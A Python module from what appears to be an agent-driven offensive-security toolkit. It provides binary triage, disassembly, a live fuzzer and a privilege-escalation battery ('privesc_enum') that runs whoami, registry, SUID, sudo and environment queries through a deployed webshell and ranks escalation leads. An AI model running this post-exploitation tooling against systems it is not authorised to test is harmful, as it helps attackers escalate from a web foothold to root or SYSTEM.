"""TOOL: binary_lane — static binary recon + live crash hunting + foothold
escalation. The lane VOIDFORGE never had: everything below the HTTP layer
that a web foothold eventually demands (can this www-data become root? what
is this binary I just pulled? does its parser break?).

v1 scope (honest): hand-rolled PE/COFF + ELF headers (no pefile dep),
capstone disassembly (optional, degrades with a clear error), REAL-process
fuzzing (the complement of binary_fuzz_run's Unicorn emulation — emulation
finds logic crashes in mapped code, this finds crashes in the REAL loader
environment: imports, CRT, relocations), and a privesc battery through the
existing shell_session foothold.
"""
import json
import math
import os
import re
import shlex
import struct
import subprocess
import sys
import tempfile
import time

from tools import register
from tools._exploit_lib import verdict

try:
    import capstone
    CAPSTONE = True
except ImportError:
    CAPSTONE = False

# exit codes that mean "the process died of corruption" (Windows NTSTATUS)
_WIN_CRASH_CODES = {0xC0000005, 0xC0000409, 0xC00000FD, 0xC0000374, 0x80000003}

_MACHINE = {0x14C: "x86", 0x8664: "x64", 0x1C4: "arm", 0xAA64: "arm64"}
_ELF_MACHINE = {3: "x86", 62: "x64", 40: "arm", 183: "arm64"}


def _entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    n = len(data)
    return -sum((c / n) * math.log2(c / n) for c in freq if c)


def _parse_pe(data: bytes) -> dict:
    """Hand-rolled COFF/PE walk — headers, sections, entry, imports."""
    out = {"format": "PE", "arch": None, "bits": None, "entry_rva": None,
           "image_base": None, "timestamp": None, "sections": [],
           "imports": [], "packer_hints": []}
    if len(data) < 0x40 or data[:2] != b"MZ":
        return None
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    if e_lfanew + 24 > len(data) or data[e_lfanew:e_lfanew + 4] != b"PE\0\0":
        return None
    coff = e_lfanew + 4
    machine, nsec, _stamp, _ptr, _nsym, _optsz = struct.unpack_from(
        "<HHIIIH", data, coff)
    out["arch"] = _MACHINE.get(machine, f"0x{machine:04x}")
    out["timestamp"] = struct.unpack_from("<I", data, coff + 4)[0]
    opt = coff + 20
    magic = struct.unpack_from("<H", data, opt)[0]
    out["bits"] = 32 if magic == 0x10B else 64 if magic == 0x20B else None
    if out["bits"]:
        out["entry_rva"] = struct.unpack_from("<I", data, opt + 16)[0]
        ib = struct.unpack_from("<I", data, opt + 28)[0]
        if out["bits"] == 64:
            ib = struct.unpack_from("<Q", data, opt + 24)[0]
        out["image_base"] = ib
    # sections
    sec0 = opt + struct.unpack_from("<H", data, coff + 16)[0]
    secs = []
    for i in range(min(nsec, 96)):
        o = sec0 + i * 40
        if o + 40 > len(data):
            break
        name = data[o:o + 8].rstrip(b"\0").decode("latin-1", "replace")
        vsize, vaddr, rawsize, rawptr = struct.unpack_from("<IIII", data, o + 8)
        chars = struct.unpack_from("<I", data, o + 36)[0]
        raw = data[rawptr:rawptr + min(rawsize, 1 << 20)]
        ent = _entropy(raw)
        ent_str = round(ent, 2) if raw else 0.0
        exec_sect = bool(chars & 0x20000000)
        secs.append({"name": name, "vsize": vsize, "rawsize": rawsize,
                     "entropy": ent_str, "executable": exec_sect})
        if name.upper().startswith(("UPX", ".aspack", ".themida")):
            out["packer_hints"].append(f"packer-named section: {name}")
        if exec_sect and rawsize > 4096 and ent >= 7.2:
            out["packer_hints"].append(
                f"executable section '{name}' entropy {ent_str} — packed/encrypted?")
    out["sections"] = secs
    # imports — walk the import directory (best-effort, PE32/PE64)
    try:
        dd_off = opt + (96 if out["bits"] == 32 else 112)
        imp_rva, imp_size = struct.unpack_from("<II", data, dd_off + 8)
        if imp_rva and imp_size:
            def rva2off(rva):
                for s in secs:
                    pass
                for i in range(min(nsec, 96)):
                    o = sec0 + i * 40
                    vsize, vaddr, rawsize, rawptr = struct.unpack_from(
                        "<IIII", data, o + 8)
                    if vaddr <= rva < vaddr + max(vsize, rawsize):
                        return rawptr + (rva - vaddr)
                return None

            def cstr(off):
                if off is None or off >= len(data):
                    return None
                end = data.find(b"\0", off, off + 256)
                return data[off:end].decode("latin-1", "replace") if end > 0 else None

            off = rva2off(imp_rva)
            for d in range(64):
                if off is None or off + 20 > len(data):
                    break
                oft, _ts, _fc, name_rva, ft = struct.unpack_from(
                    "<IIIII", data, off)
                if not (oft or name_rva or ft):
                    break
                dll = cstr(rva2off(name_rva)) or "?"
                funcs = []
                thunk_rva = (oft or ft)
                toff = rva2off(thunk_rva)
                for t in range(512):
                    if toff is None or toff + (8 if out["bits"] == 64 else 4) > len(data):
                        break
                    if out["bits"] == 64:
                        val = struct.unpack_from("<Q", data, toff)[0]
                        toff += 8
                    else:
                        val = struct.unpack_from("<I", data, toff)[0]
                        toff += 4
                    if not val:
                        break
                    if val & (1 << 63 if out["bits"] == 64 else 1 << 31):
                        continue  # ordinal
                    fname = cstr(rva2off(val + (2 if out["bits"] == 64 else 2)))
                    if fname:
                        funcs.append(fname)
                out["imports"].append({"dll": dll, "count": len(funcs),
                                       "funcs": funcs[:24]})
    except Exception:
        pass  # best-effort — triage never dies on a weird import table
    return out


def _parse_elf(data: bytes) -> dict:
    if len(data) < 20 or data[:4] != b"\x7fELF":
        return None
    out = {"format": "ELF", "arch": None, "bits": None, "entry": None,
           "sections": [], "imports": [], "packer_hints": []}
    out["bits"] = 64 if data[4] == 2 else 32
    etype, emach = struct.unpack_from("<HH", data, 16)
    out["arch"] = _ELF_MACHINE.get(emach, f"0x{emach:04x}")
    if out["bits"] == 64 and len(data) >= 0x28:
        out["entry"] = struct.unpack_from("<Q", data, 0x18)[0]
    elif out["bits"] == 32 and len(data) >= 0x24:
        out["entry"] = struct.unpack_from("<I", data, 0x18)[0]
    return out


@register(
    name="bin_triage",
    desc="RECON: static binary triage — hand-rolled PE/COFF + ELF header "
         "walk: arch, bits, entry point, section table with per-section "
         "entropy, PE import table, packer hints (UPX-style names, "
         "high-entropy executable sections). No dependencies, never fails "
         "on a weird file: returns what it could see.",
    params={"type": "object", "properties": {
        "path": {"type": "string", "description": "Path to the binary file"},
    }, "required": ["path"]},
    danger="quiet")
def bin_triage(path):
    if not os.path.isfile(path):
        return verdict("bin_triage", False, f"fichier introuvable : {path}")
    with open(path, "rb") as f:
        data = f.read(8 << 20)  # 8MB triage cap
    info = _parse_pe(data) or _parse_elf(data)
    if not info:
        return verdict("bin_triage", False,
                       "format non reconnu (ni MZ/PE ni ELF) — raw sample",
                       first16=data[:16].hex())
    info["size"] = os.path.getsize(path)
    info["sha_like"] = f"{len(data)}bytes"
    ok = bool(info.get("sections") or info.get("format") == "ELF")
    return verdict("bin_triage", ok,
                   f"{info['format']} {info.get('arch')} "
                   f"{'packed-suspect' if info['packer_hints'] else 'clean'} "
                   f"({len(info.get('sections', []))} sections, "
                   f"{len(info.get('imports', []))} imports)",
                   evidence=info)


@register(
    name="bin_strings",
    desc="RECON: filtered strings extraction from a binary — ASCII runs "
         "categorized into URLs, file paths, registry keys, base64-ish "
         "blobs and raw strings. The fastest way to see what a binary "
         "touches before any disassembly.",
    params={"type": "object", "properties": {
        "path": {"type": "string"},
        "min_len": {"type": "integer", "default": 6},
        "max_results": {"type": "integer", "default": 120},
    }, "required": ["path"]},
    danger="quiet")
def bin_strings(path, min_len=6, max_results=120):
    if not os.path.isfile(path):
        return verdict("bin_strings", False, f"fichier introuvable : {path}")
    with open(path, "rb") as f:
        data = f.read(8 << 20)
    pat = re.compile(rb"[\x20-\x7e]{%d,}" % max(4, int(min_len)))
    cats = {"urls": [], "paths": [], "registry": [], "base64ish": [],
            "other": []}
    for m in pat.finditer(data):
        s = m.group().decode("latin-1")
        if len(cats["other"]) >= max_results * 3:
            break
        low = s.lower()
        if low.startswith(("http://", "https://")) or "://www." in low:
            cats["urls"].append(s[:200])
        elif low.startswith(("c:\\", "hklm", "hkcu", "software\\")) or \
                ("/usr/" in low or "/etc/" in low):
            cats["paths" if "\\" in s or "/usr" in low or "/etc" in low
                 else "other"].append(s[:200])
        elif low.startswith(("hkey_", "hklm\\", "hkcu\\")):
            cats["registry"].append(s[:200])
        elif re.fullmatch(r"[A-Za-z0-9+/=]{20,}", s) and len(s) % 4 == 0:
            cats["base64ish"].append(s[:120])
        else:
            cats["other"].append(s[:200])
    for k in cats:
        cats[k] = cats[k][:max_results]
    total = sum(len(v) for v in cats.values())
    return verdict("bin_strings", total > 0,
                   f"{total} strings extraites "
                   f"({len(cats['urls'])} urls, {len(cats['paths'])} paths)",
                   evidence=cats)


@register(
    name="bin_disasm",
    desc="RECON: disassemble raw bytes from a binary via capstone — point "
         "at an offset (or the PE entry point) and read the actual "
         "instructions. arch auto-detected from PE/ELF headers, overridable. "
         "The bridge between static triage and understanding what a binary "
         "does with your input.",
    params={"type": "object", "properties": {
        "path": {"type": "string"},
        "offset": {"type": "integer", "description": "file offset to start "
                   "disassembling; omit = entry point for PE"},
        "length": {"type": "integer", "default": 256},
        "arch": {"type": "string", "enum": ["auto", "x86", "x64", "arm",
                                            "arm64"], "default": "auto"},
    }, "required": ["path"]},
    danger="quiet")
def bin_disasm(path, offset=None, length=256, arch="auto"):
    if not CAPSTONE:
        return verdict("bin_disasm", False,
                       "capstone absent — python -m pip install capstone")
    if not os.path.isfile(path):
        return verdict("bin_disasm", False, f"fichier introuvable : {path}")
    with open(path, "rb") as f:
        data = f.read(4 << 20)
    if arch == "auto":
        info = _parse_pe(data) or _parse_elf(data)
        arch = (info or {}).get("arch") or "x64"
    if offset is None:
        info = _parse_pe(data)
        if info and info.get("entry_rva") is not None:
            offset = info["entry_rva"]  # ~ file offset for most raw dumps
        else:
            offset = 0
    offset = max(0, int(offset))
    length = min(int(length), 4096)
    m = {"x86": (capstone.CS_ARCH_X86, capstone.CS_MODE_32),
         "x64": (capstone.CS_ARCH_X86, capstone.CS_MODE_64),
         "arm": (capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM),
         "arm64": (capstone.CS_ARCH_ARM64, capstone.CS_MODE_ARM)}[arch]
    md = capstone.Cs(m[0], m[1])
    lines = []
    for insn in md.disasm(data[offset:offset + length], 0x400000 + offset):
        lines.append(f"0x{insn.address:x}  {insn.mnemonic} {insn.op_str}")
        if len(lines) >= 220:
            break
    return verdict("bin_disasm", bool(lines),
                   f"{len(lines)} instructions ({arch}) @0x{offset:x}",
                   evidence={"arch": arch, "offset": offset,
                             "asm": lines})


def _argv_from_template(tmpl: str, inpath: str) -> list:
    """Windows-native argv splitter: double quotes group tokens, backslashes
    are LITERAL (shlex POSIX rules were eating C:\\Users → C:Users and the
    script vanished from argv — 0 crashes, exit 2, silencieux)."""
    tail, cur, in_q = [], "", False
    for ch in tmpl or "":
        if ch == '"':
            in_q = not in_q
        elif ch in " \t" and not in_q:
            if cur:
                tail.append(cur)
                cur = ""
        else:
            cur += ch
    if cur:
        tail.append(cur)
    return [t.replace("{INPUT}", inpath) if "{INPUT}" in t else t
            for t in tail]


@register(
    name="bin_fuzz_live",
    desc="EXPLOIT: real-process crash hunting — mutate inputs and run the "
         "target binary for real (imports, CRT, loader, relocations), not "
         "emulated. Detects access violations, stack overruns and heap "
         "corruption exit codes; saves every crashing input. The "
         "complement of binary_fuzz_run (Unicorn): emulation finds logic "
         "bugs in mapped code, this finds bugs that need the real "
         "environment. ROE applies — the target must be yours to test.",
    params={"type": "object", "properties": {
        "target": {"type": "string", "description": "Path to the executable"},
        "seed": {"type": "string", "description": "Optional seed input file"},
        "iterations": {"type": "integer", "default": 200},
        "max_total_s": {"type": "integer", "default": 120,
                        "description": "wall-clock budget"},
        "per_run_timeout_s": {"type": "number", "default": 5},
        "args_template": {"type": "string",
                          "description": "args with {INPUT} placeholder; "
                          "omit = input fed via stdin"},
    }, "required": ["target"]},
    danger="loud")
def bin_fuzz_live(target, seed=None, iterations=200, max_total_s=120,
                  per_run_timeout_s=5, args_template=None):
    if not os.path.isfile(target):
        return verdict("bin_fuzz_live", False,
                       f"cible introuvable : {target}")
    if seed and os.path.isfile(seed):
        with open(seed, "rb") as f:
            base = f.read(65536)
    else:
        base = b"A" * 64
    crash_dir = os.path.join(os.path.dirname(os.path.abspath(target)),
                             "crashes_live")
    try:
        os.makedirs(crash_dir, exist_ok=True)
    except OSError:
        # AUDIT-live: cible système (C:\Python314\…) → on n'écrit JAMAIS
        # chez elle; les crash inputs partent dans un bac temporaire.
        crash_dir = tempfile.mkdtemp(prefix="vf_crashes_live_")
    import random
    rng = random.Random(os.urandom(8))
    crashes, ran, deadline = [], 0, time.time() + min(int(max_total_s), 600)

    def _run(inp: bytes) -> subprocess.CompletedProcess:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as tf:
            tf.write(inp)
            inpath = tf.name
        try:
            if args_template:
                # splitter natif Windows (shlex POSIX dévorait les
                # backslashes des chemins) ; stdin seulement si le template
                # ne porte PAS déjà {INPUT} en argument. WinError 193 (target
                # n'est pas un exe — .py/.jar) → repli automatique via
                # l'interpréteur courant.
                argv = [target] + _argv_from_template(args_template, inpath)
                try:
                    return subprocess.run(
                        argv, timeout=per_run_timeout_s, capture_output=True,
                        input=None if "{INPUT}" in args_template else inp)
                except OSError as ex:
                    if ex.winerror != 193:
                        raise
                    # la cible déclarée n'est pas un exécutable (193) —
                    # repli via l'interpréteur: le token APRÈS le target
                    # est le script (argv[1:]), jamais argv[0]=target mort.
                    if len(argv) < 2 or not os.path.isfile(argv[1]):
                        raise
                    return subprocess.run(
                        [sys.executable] + argv[1:],
                        timeout=per_run_timeout_s, capture_output=True,
                        input=None if "{INPUT}" in args_template else inp)
            return subprocess.run([target], input=inp,
                                  timeout=per_run_timeout_s,
                                  capture_output=True)
        finally:
            try:
                os.unlink(inpath)
            except OSError:
                pass

    def _is_crash(r) -> bool:
        rc = r.returncode
        if rc is None:
            return False
        if os.name == "nt":
            return (rc in _WIN_CRASH_CODES or
                    (rc < 0 and -rc in _WIN_CRASH_CODES))
        return rc < 0  # POSIX: killed by signal

    i = 0
    while i < iterations and time.time() < deadline and len(crashes) < 40:
        buf = bytearray(base)
        op = rng.randint(0, 4)
        if op == 0 and buf:
            buf[rng.randrange(len(buf))] = rng.randint(0, 255)
        elif op == 1 and len(buf) > 4:
            buf[rng.randrange(len(buf) - 4):] = bytes(
                [0xFF] * rng.randint(1, 64))
        elif op == 2:
            buf += rng.choice([b"%n%n%n%n%n", b"A" * 4096, b"../" * 64,
                               bytes(128)])
        elif op == 3 and buf:
            pos = rng.randrange(len(buf))
            buf[pos:pos + 4] = b"\xEB\xFE" * 2
        else:
            buf = bytearray(rng.randbytes(rng.randint(8, 2048)))
        try:
            r = _run(bytes(buf))
        except subprocess.TimeoutExpired:
            ran += 1
            i += 1
            continue
        ran += 1
        i += 1
        if _is_crash(r):
            cp = os.path.join(crash_dir,
                              f"crash_{i:04d}_{os.urandom(2).hex()}.bin")
            with open(cp, "wb") as f:
                f.write(bytes(buf))
            crashes.append({"input_file": cp, "exit_code": r.returncode,
                            "iter": i})
    crashed = bool(crashes)
    return verdict("bin_fuzz_live", "partial" if crashed else False,
                   f"{len(crashes)} crash(es) / {ran} runs — "
                   f"inputs sauvés dans {crash_dir}",
                   evidence={"crashes": crashes, "runs": ran},
                   **({"crashed": True} if crashed else {}))


# ── privesc battery through the existing web foothold ────────────────
# AUDIT B1: shell_session exécute commands[:6] — une batterie de 8 ordres
# perdait SILENCIEUSEMENT wmic + icacls (la source des unquoted paths!).
# La batterie est donc CHUNCKÉE ≤6 par appel, et le parsing se fait PAR
# COMMANDE sur l'output brut (les newlines réels) — plus jamais sur un
# json.dumps où \n échappé tue les ancres ^...$ (AUDIT B5).
_WIN_BATTERY = [
    "whoami /all",
    "whoami /priv",
    "cmd /c ver",
    "net localgroup administrators",
    "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v "
    "AlwaysInstallElevated",
    "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v "
    "AlwaysInstallElevated",
    "wmic service get name,pathname,startmode,startname",
    "icacls \"C:\\ProgramData\"",
]
_LIN_BATTERY = [
    "id", "sudo -n -l 2>&1", "uname -a",
    "find / -perm -4000 -type f 2>/dev/null | head -40",
    "cat /etc/crontab 2>/dev/null", "ls -la /etc/passwd", "env 2>/dev/null",
]

_CMD_CHUNK = 6  # shell_session hard cap


def _parse_battery_win(results) -> list:
    """Pure parser over [{cmd, output}] pairs — real newline text only."""
    findings = []
    for item in results or []:
        out = (item.get("output") or "") if isinstance(item, dict) else ""
        cmd = (item.get("cmd") or "") if isinstance(item, dict) else ""
        if not out:
            continue
        # privileges — the potato gate
        for priv, why in (("SeImpersonatePrivilege",
                           "potato family (Juicy/Hot/Sweet) — token "
                           "impersonation to SYSTEM"),
                          ("SeAssignPrimaryTokenPrivilege",
                           "token privilege — SYSTEM spawn")):
            m = re.search(re.escape(priv) + r"[^\r\n]*", out)
            if m and "Disabled" not in m.group(0):
                findings.append({"check": f"{priv} ENABLED", "why": why})
        if cmd.startswith("reg query") and \
                re.search(r"AlwaysInstallElevated\s+REG_DWORD\s+0x1", out):
            findings.append({"check": "AlwaysInstallElevated = 1",
                             "why": "any MSI installs as SYSTEM"})
        if cmd.startswith("wmic"):
            for mp in re.finditer(r"([A-Za-z]:\\[^\r\n]*?\.exe)", out):
                p = mp.group(1).strip()
                if (" " in p and not p.startswith('"')
                        and "windows" not in p.lower()):
                    findings.append({
                        "check": f"unquoted service path: {p}",
                        "why": "plant exe at the space → service restart "
                               "= service account"})
                    break
        if cmd.startswith("net localgroup") and \
                re.search(r"(?i)administrators", out) and \
                re.search(r"^[A-Za-z0-9_.\- ]{2,32}\s*$", out, re.M):
            findings.append({"check": "local Administrators membership "
                                      "(verify whoami against the list)",
                             "why": "already admin (UAC matters) — done"})
    return findings


def _parse_battery_lin(results) -> list:
    findings = []
    for item in results or []:
        out = (item.get("output") or "") if isinstance(item, dict) else ""
        cmd = (item.get("cmd") or "") if isinstance(item, dict) else ""
        if not out:
            continue
        if "NOPASSWD" in out:
            findings.append({"check": "sudo NOPASSWD entries",
                             "why": "passwordless sudo — see sudo -l output"})
        if re.search(r"-rw-rw-rw-.*\s/etc/passwd", out):
            findings.append({"check": "/etc/passwd world-writable",
                             "why": "append root line directly"})
        if cmd.startswith("find"):
            for m in re.finditer(r"^(/[\w./-]+)$", out, re.M):
                p = m.group(1)
                if p.startswith(("/usr/bin/su", "/bin/mount", "/usr/bin/sudo",
                                 "/usr/bin/passwd", "/bin/umount")):
                    continue
                findings.append({"check": f"SUID binary: {p}",
                                 "why": "GTFOBins check needed"})
                break
        if "(ALL" in out and ":" in out and "NOPASSWD" not in out and \
                cmd.startswith("sudo"):
            findings.append({"check": "sudo ALL rights (needs password)",
                             "why": "password reuse attack surface"})
    return findings


@register(
    name="privesc_enum",
    desc="POST-EXPLOIT: privilege-escalation battery through an existing "
         "web foothold (shell_session) — whoami/privileges, "
         "AlwaysInstallElevated, unquoted service paths, admin membership "
         "(Windows) or sudo/SUID/writable-creds (Linux). Parses the output "
         "into ranked findings with the why and the known technique. This "
         "is the bridge from web access to the machine below it.",
    params={"type": "object", "properties": {
        "shell_url": {"type": "string",
                      "description": "URL of the deployed webshell"},
        "param": {"type": "string", "default": "cmd"},
        "os_flavor": {"type": "string", "enum": ["windows", "linux", "auto"],
                      "default": "auto"},
    }, "required": ["shell_url"]},
    danger="loud")
def privesc_enum(shell_url, param="cmd", os_flavor="auto"):
    from tools.upload_shell import shell_session
    # flavor probe first when auto
    if os_flavor == "auto":
        probe = shell_session(shell_url, commands=["cmd /c ver || uname -a"],
                              param=param)
        try:
            probe_data = json.loads(probe) if isinstance(probe, str) else probe
            probe_txt = json.dumps(probe_data, ensure_ascii=False)
        except Exception:
            probe_txt = str(probe)
        os_flavor = "windows" if "icrosoft" in probe_txt or \
            "indows" in probe_txt else "linux"
    battery = _WIN_BATTERY if os_flavor == "windows" else _LIN_BATTERY
    # AUDIT B1: shell_session executes commands[:6] — chunk the battery,
    # or wmic/icacls (the unquoted-path SOURCE) silently never run.
    all_results = []
    for i in range(0, len(battery), _CMD_CHUNK):
        chunk = battery[i:i + _CMD_CHUNK]
        raw = shell_session(shell_url, commands=chunk, param=param)
        try:
            data = json.loads(raw) if isinstance(raw, str) else raw
        except Exception:
            continue
        # results[] lives inside the verdict payload (top-level extra key)
        chunk_results = (data.get("results") if isinstance(data, dict)
                         else None) or []
        all_results.extend(chunk_results)
    findings = (_parse_battery_win(all_results) if os_flavor == "windows"
                else _parse_battery_lin(all_results))
    commands_run = len(all_results)
    exp = "partial" if findings else False
    return verdict("privesc_enum", exp,
                   f"{len(findings)} piste(s) d'escalade sur un foothold "
                   f"{os_flavor} ({commands_run} commandes exécutées)",
                   evidence={"findings": findings},
                   os_flavor=os_flavor, battery=len(battery),
                   commands_run=commands_run)
